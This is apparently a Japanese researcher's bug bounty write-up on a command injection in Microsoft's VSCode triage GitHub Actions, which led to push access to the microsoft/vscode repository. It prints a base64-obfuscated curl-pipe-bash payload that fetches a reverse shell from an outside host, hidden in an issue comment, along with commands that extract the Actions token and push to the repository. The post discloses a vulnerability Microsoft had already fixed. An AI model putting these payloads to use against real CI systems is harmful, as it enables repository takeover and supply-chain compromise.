---
title: "VSCodeのGitHubリポジトリに対する不正なPushアクセス"
date: 2021-01-12T10:43:55+09:00
draft: false
tags: [Bug Bounty, Microsoft, VSCode, RCE]
---

## はじめに
Microsoftは脆弱性の診断行為を[セーフハーバー](https://www.microsoft.com/en-us/msrc/bounty-safe-harbor)により許可しています。  
本記事は、そのセーフハーバーを遵守した上で発見/報告した脆弱性を解説したものであり、無許可の脆弱性診断行為を推奨する事を意図したものではありません。  
Microsoftが運営/提供するサービスに脆弱性を発見した場合は、[Microsoft Bug Bounty Program](https://www.microsoft.com/en-us/msrc/bounty)へ報告してください。  

## 要約
VSCodeのIssue管理機能に脆弱性が存在し、不適切な正規表現、認証の欠如、コマンドインジェクションを組み合わせることによりVSCodeのGitHubリポジトリに対する不正な書き込みが可能だった。  

## 発見のきっかけ
電車に乗っている際にふと思い立って[`microsoft/vscode`](https://github.com/microsoft/vscode)を眺めていた所、CI用のスクリプトが別のリポジトリ([`microsoft/vscode-github-triage-actions`](https://github.com/microsoft/vscode-github-triage-actions))にまとめられていることに気がついた。  
非常に暇だったのでそのスクリプトを眺めていた際に、以下のようなコードを発見した[^1]:
[^1]: https://github.com/microsoft/vscode-github-triage-actions/blob/cd7ec725801fe3107cc33cf9a1446f36441cee8b/api/octokit.ts#L161
```typescript
exec(`git -C ./repo merge-base --is-ancestor ${commit} ${release}`, (err) => {
	[...]
}),
```
`commit`変数または`release`変数に任意の入力ができれば、コマンドインジェクションができるな、と思い追加で調査することにした。  

## コードを読む
電車の中でPCを広げるわけにもいかないため、スマホでGitHubの検索機能を用いてコードを読むことにした。  
上記のコマンドインジェクションができそうな処理を含む関数の名前が[`releaseContainsCommit`](https://github.com/microsoft/vscode-github-triage-actions/blob/cd7ec725801fe3107cc33cf9a1446f36441cee8b/api/octokit.ts#L159)だったため、そのまま検索すると5件の検索結果が帰ってきた。  
その内1件がテスト用のコード[^2]、2件が上記の関数の定義[^3]、2件がこの関数を使用しているコード[^4]だった。  
これらのコードの流れを軽く追ってみると、特定の条件[^5]を満たすIssue内でそのIssueをクローズする要因となったコミットハッシュを[`getClosingInfo`](https://github.com/microsoft/vscode-github-triage-actions/blob/cd7ec725801fe3107cc33cf9a1446f36441cee8b/api/octokit.ts#L362)関数より取得し、[`releaseContainsCommit`](https://github.com/microsoft/vscode-github-triage-actions/blob/cd7ec725801fe3107cc33cf9a1446f36441cee8b/api/octokit.ts#L159)へ渡していた。[^6](上記の`commit`変数)  
[^2]: https://github.com/microsoft/vscode-github-triage-actions/blob/cd7ec725801fe3107cc33cf9a1446f36441cee8b/api/testbed.ts#L68-L70
[^3]: https://github.com/microsoft/vscode-github-triage-actions/blob/db8d13b11082eb0d14a2b4fb5bc19d30f2531b4d/api/octokit.ts#L158  
https://github.com/microsoft/vscode-github-triage-actions/blob/0c3e4907d6516778ea95d7bb657b8eb5c44ac49d/api/api.ts#L21
[^4]: https://github.com/microsoft/vscode-github-triage-actions/blob/cd7ec725801fe3107cc33cf9a1446f36441cee8b/release-pipeline/ReleasePipeline.ts#L49-L54  
https://github.com/microsoft/vscode-github-triage-actions/blob/cd7ec725801fe3107cc33cf9a1446f36441cee8b/author-verified/AuthorVerified.ts#L81-L84  
[^5]: https://github.com/microsoft/vscode-github-triage-actions/blob/0c3e4907d6516778ea95d7bb657b8eb5c44ac49d/author-verified/AuthorVerified.ts#L20  
https://github.com/microsoft/vscode-github-triage-actions/blob/0c3e4907d6516778ea95d7bb657b8eb5c44ac49d/release-pipeline/ReleasePipeline.ts#L21
[^6]: https://github.com/microsoft/vscode-github-triage-actions/blob/cd7ec725801fe3107cc33cf9a1446f36441cee8b/author-verified/AuthorVerified.ts#L71-L84

## 不適切な正規表現
[`getClosingInfo`](https://github.com/microsoft/vscode-github-triage-actions/blob/cd7ec725801fe3107cc33cf9a1446f36441cee8b/api/octokit.ts#L362)関数では、Issueをクローズする際にコミットを関連付けし忘れた場合でも問題なくIssueの管理を続けられるように、`\closedWith`というコマンドを用意していた[^7]。  
このコマンドは、`\closedWith コミットハッシュ`といったような形式のコメントをIssueに対して追加することにより、特定のコミットハッシュをIssueと関連付けることができるのだが、このコマンドをコメント内から検索する正規表現[^8]に問題があった。
[^7]: https://github.com/microsoft/vscode-github-triage-actions/blob/cd7ec725801fe3107cc33cf9a1446f36441cee8b/api/octokit.ts#L402-L411
[^8]: https://github.com/microsoft/vscode-github-triage-actions/blob/cd7ec725801fe3107cc33cf9a1446f36441cee8b/api/octokit.ts#L374
```javascript
/(?:\\|\/)closedWith (\S*)/
```

この正規表現は、`\closedWith `または`/closedWith `で始まり、その後ホワイトスペースが出てくるまでの文字列にマッチする。  
ここでは、`\closedWith コミットハッシュ`というコマンドにのみマッチすればよかったため、`\S`の部分を`[a-fA-F0-9]`にするべきだった。  
また、この正規表現は文頭に`\closedWith `がある必要がないため、Issueのコメントのどこかに`\closedWith `という文字列を含められればコマンドとして認識されてしまう。  
そのため、`<!-- \closedWith コミットハッシュ -->`といったようなコメントをされた際に、コマンドを実行されたと認識できずにコマンドが実行されてしまう恐れがあった。  

## 認証の欠如
また、この関数内では本来行われるべき権限の確認が行われていなかった。  
[`microsoft/vscode`](https://github.com/microsoft/vscode)リポジトリ内では、以下のような形で`\closedWith`コマンドを実行できるユーザーを絞っていた[^9]が、この認証の欠如により権限を持たないユーザーがコミットの関連付けを行える状態となってしまっていた。  
[^9]: https://github.com/microsoft/vscode/blob/c7fa31fc926a006865462fa9bba5760364434bcc/.github/commands.json#L143-L154
```json
{
	"type": "comment",
	"name": "closedWith",
	"allowUsers": [
		"cleidigh",
		"usernamehw",
		"gjsjohnmurray",
		"IllusionMH"
	],
	"action": "close",
	"addLabel": "unreleased"
},
```

## 脆弱性を突けるか
これらの脆弱性を用いることにより、`\closedWith`コマンドの引数にある程度任意の内容が渡せ、その入力をコマンドインジェクションが存在する箇所へと渡せることがわかった。  
つまり、特定の条件[^5]を満たすIssueに対して``\closedWith `ここにコマンド` ``といったようなコメントを行えばGitHub Actions内で任意のコマンドを実行できるのだが、Issueが以下の検索クエリのどちらかに引っかかる必要があり、ラベル付けを行う権限が無い一般ユーザーが能動的に脆弱性を突くのは厳しい可能性があった。  
```typescript
`is:closed label:${this.notYetReleasedLabel}`
```

```typescript
`is:closed label:${this.pendingReleaseLabel} label:${this.authorVerificationRequestedLabel}`
```

また、脆弱性が存在する`author-verified`スクリプト及び`release-pipeline`スクリプトを使用しているワークフローは3つ[^10]あったが、そのうち2つは特定のラベルがIssueについている状態でそのIssueがクローズされた際や、Issueにラベル付けされた際などに発火するもので、能動的な悪用が困難な状態だった。  
しかしながら、最後の一つ[^11]は`schedule`でワークフローを発火させており、毎日14時20分(UTC)になると以下のクエリに合致するIssueに対して上記の関連コミット検索が行われるように設定されていた。  
```
is:closed label:awaiting-insiders-release label:author-verification-requested
```
この条件に合致するIssueを検索した所、脆弱性の調査時点で一件のIssue[^12]が該当することがわかった。  
[このIssue](https://github.com/microsoft/vscode/issues/113374)を用いることにより、脆弱性を突けることがわかったため、実際に突いてみることにした。  
[^10]: https://github.com/microsoft/vscode/blob/c7fa31fc926a006865462fa9bba5760364434bcc/.github/workflows/release-pipeline-labeler.yml  
https://github.com/microsoft/vscode/blob/c7fa31fc926a006865462fa9bba5760364434bcc/.github/workflows/on-label.yml  
https://github.com/microsoft/vscode/blob/c7fa31fc926a006865462fa9bba5760364434bcc/.github/workflows/author-verified.yml  
[^11]: https://github.com/microsoft/vscode/blob/c7fa31fc926a006865462fa9bba5760364434bcc/.github/workflows/author-verified.yml
[^12]: https://github.com/microsoft/vscode/issues/113374

## 脆弱性を突く
前述の通り、``\closedWith `コマンド` ``のようなコメントを書き込むことにより脆弱性を突くことが出来る。  
しかしながら、対象のIssueは公開されている状態であり、そのまま書き込んでしまうと他のユーザーに脆弱性の概要を把握され、悪用されてしまう可能性があった。  
そのため、文中のどこかに`\closedWith`が含まれていればいいという挙動を利用し、普通のコメントに偽装して脆弱性を突くことにした。  
```markdown
Does the next version fix this issue? <!-- \closedWith `ここにコマンド` -->
```

また、このタスクが実行されるのが14時20分(UTC)であり、JSTに直すと23時20分であるため、とても眠い中作業をすることになる可能性があった。  
そのため、眠気による事故が起きないよう予め脆弱性を突いた後の動きをある程度決めてから行うことにした。（実際めっちゃ眠かった)  

## 影響の特定
予め動きを決めておくためには、この脆弱性を突くことにより発生し得る影響を特定しなければならない。  
幸いにも、CI内で使用されているスクリプト郡は全てGitHub上でホストされているため、実際に脆弱性を突く前にある程度正確な影響を把握することができた。  

まず大前提として、GitHub Actionsは`pull_request`イベント以外では`secrets.GITHUB_TOKEN`にリポジトリに対する書き込み権限を持ったGitHub Access Tokenをセットする[^13]。  
次に、[`actions/checkout`](https://github.com/actions/checkout)はデフォルトでディスク上に`secrets.GITHUB_TOKEN`を残す[^14]。  
最後に、[`actions/checkout`](https://github.com/actions/checkout)を実行した後のステップではディスク上に`secrets.GITHUB_TOKEN`が残っている。  
これにより、[`actions/checkout`](https://github.com/actions/checkout)を実行した後のステップで任意のコードを実行できた場合、発火元のイベントが`pull_request`でなければGitHub Actionsを実行しているリポジトリに対して書き込み権限を得ることが出来る。  
[^13]: https://docs.github.com/en/free-pro-team@latest/actions/reference/authentication-in-a-workflow#permissions-for-the-github_token
[^14]: https://github.com/actions/checkout/blob/61b9e3751b92087fd0b06925ba6dd6314e06f089/action.yml#L48-L50

## 計画
ここまでの考えに至った後、実際に作業状態になったのが大体18時頃だったため、ご飯を食べてお風呂に入る時間を除くと約4時間ほどで計画を練る必要があった。  
作業を行う準備を終えた後、まず初めに、Issueのコメントで使用するPayloadを考えた。  
GitHubのMarkdownのパース仕様上、コメントアウトの中では`--`が使えず、また正規表現によりホワイトスペースが使用できないため、最終的なPayloadは以下のようになった。(冗長な所があると思うが、時間がなかったので許してほしい)  
```markdown
Does the next version fix this issue? <!-- \closedWith `eval${IFS}$(echo${IFS}'Y3VybCAiaHR0cHM6Ly9yeTB0YWsuZ2l0aHViLmlvL3BheWxvYWRzL2Q1MGNmMWRmYjJlNzQ5Y2RhYTQ2ZjBiOGQ1ZGEzMzFkLnNoIiB8IGJhc2g='|base64${IFS}-d)` -->
```
このPayloadでは、`curl https://ry0tak.github.io/payloads/d50cf1dfb2e749cdaa46f0b8d5da331d.sh | bash`をBase64エンコードした物をデコードし、それをコマンドとして実行している。  
現在は削除されているが、このリンク先のスクリプトはリバースシェルを張るものだったため、このコマンドが実行された時点で任意の操作をGitHub Actions上で行えるようになっていた。  

次に、リバースシェルを張った後に実行するコマンドを考えた。  
[`actions/checkout`](https://github.com/actions/checkout)は、ローカルのGitリポジトリに対して適切に認証を行うための設定を自動で行う。  
そのため、そのリポジトリを利用して無害なファイルをプッシュするのが最も簡単で良いという結論に至り、以下のようなコマンドを実行することにした。  
```shell
cd repo

git config --global user.name "Ry0taK"
git config --global user.email "49341894+Ry0taK@users.noreply.github.com"

echo -e "This is a PoC for my MSRC report. (No malicious intent here! This is not a phishing!)\nIt would be appreciated if you don't delete the commit history until the MSRC team reviewed my report. (This is 'Reliable & minimized proof-of-concept' defined here: https://www.microsoft.com/en-us/msrc/bounty-example-report-submission)\nIf you are a maintainer, please send me a message at Twitter (@ryotkak) with a proof of maintainer for quick fix." > ryotak.txt
git add ryotak.txt
git commit -m "Add MSRC PoC"
git push
```
最後に、脆弱性を突いた後すぐにMicrosoftへ報告できるように、予め脆弱性が突けたと仮定したレポートを作成し、コピペすればレポートが送信できる状態にしておいた。  

## 実行
23時20分(JST)に処理が走るため、23時15分ごろにコメントを追加した。[^15]  
その後、23時41分になってワークフローが実行され[^16]、リバースシェルが張られた。  
しかしながら、上記の手順でコマンドを実行した際に、`master`ブランチにブランチ保護がかかっているというエラーが出てしまった。  
そのため、慌てて以下のコマンドを実行し`ryotak`ブランチを新規に作成、プッシュした: https://github.com/microsoft/vscode/commit/2dadb25aeb01922fcc321ebba95bd0a95d12ec0a
```shell
git checkout -b ryotak
git push -u origin ryotak
```
![VSCodeのryotakブランチの画像](/img/vscode-ryotak-branch.png)
その後、ブランチ保護を回避する方法を探すために、以下のコマンドを実行してGitHub Access Tokenを抽出した。  
```shell
auth_conf=$(git config --get http.https://github.com/.extraheader)	
encoded=$(echo $auth_conf | sed s/"AUTHORIZATION: basic "//)	
decoded=$(echo $encoded | base64 -d | sed s/"x-access-token:"// | tr -d '\n')
echo $decoded
```
このトークンを用いて、ブランチ保護を確認した所、`master`ブランチにはアカウントベースのマージ保護があり、ブランチ保護の回避は困難であることがわかった。  
他の重要そうなブランチを調査した結果、リリースブランチに対してはアカウントベースのマージ保護が存在せず、書き込みアクセスを持つユーザー1名以上のApproveがあればプルリクエストをマージできることが判明した。  
GitHub Actionsに付与されるトークンは`github-actions`というBotユーザーのものであるため、プルリクエストのApproveを行うことができる。
これを用いることにより、リリースブランチに対して任意のコミットが出来ることを証明することができた: https://github.com/microsoft/vscode/pull/113596
![VSCodeのプルリクの画像](/img/vscode-pullrequest.png)
[^15]: https://github.com/microsoft/vscode/issues/113374#issuecomment-752092722  
[^16]: https://github.com/microsoft/vscode/actions/runs/450927894  

## まとめ
今回の記事は、CIのスクリプト内に存在した脆弱性を紹介しました。  
CIのスクリプトは、普段OSSの監査を行う際等にあまり気にしない箇所であったため、かなり印象的でした。  
また、今回の脆弱性報告のプロセス中、Microsoft側の応答が非常に丁寧かつ迅速でとても好印象でした。  
実際には行いませんでしたが、リポジトリに対する書き込み権限があったため、新規バージョンのリリース等も実行できたのではないかな、と思っています。  

本記事に関する質問はTwitter([@ryotkak](https://twitter.com/ryotkak))へメッセージを投げてください。
## タイムライン
|日付|出来事|
|----|----|
|2020/12/29 13時頃|コマンドインジェクションを発見|
|2020/12/29 14時頃|脆弱性が突けそうであることを確認|
|2020/12/29 18時頃|帰宅した後、準備を開始|
|2020/12/29 21時頃|諸々の準備を完了|
|2020/12/29 23:15|PayloadをIssueに書き込み|
|2020/12/29 23:41|GitHub Actions内からリバースシェルが張られる|
|2020/12/29 23:41|masterへプッシュできないことを確認|
|2020/12/29 23:45頃|GitHub Actionsのトークンを入手|
|2020/12/29 23:50頃|ブランチ保護に関する調査完了|
|2020/12/29 24時頃|脆弱性の影響範囲の特定|
|2020/12/29 24時頃|脆弱性の報告|
|2021/01/01|脆弱性の一時対応が完了|
|2021/01/05|脆弱性の修正が完了|
|2021/01/12|脆弱性の開示許可を求める|
|2021/01/12|脆弱性の開示許可が出る|
|2021/01/12|脆弱性の開示|
